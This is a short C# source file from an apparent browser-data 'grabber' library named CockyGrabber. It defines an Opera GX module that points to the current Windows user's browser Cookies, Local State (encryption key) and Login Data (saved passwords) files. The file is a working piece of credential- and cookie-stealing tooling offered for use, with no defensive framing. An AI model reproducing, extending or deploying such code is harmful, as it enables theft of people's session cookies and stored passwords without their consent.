using System;

namespace CockyGrabber.Grabbers
{
    public class OperaGxGrabber : ChromiumGrabber

    {
        public override string ChromiumBrowserCookiePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Cookies";
            }
        }
        public override string ChromiumBrowserLocalStatePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State";
            }
        }
        public override string ChromiumBrowserLoginDataPath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data";
            }
        }
    }
}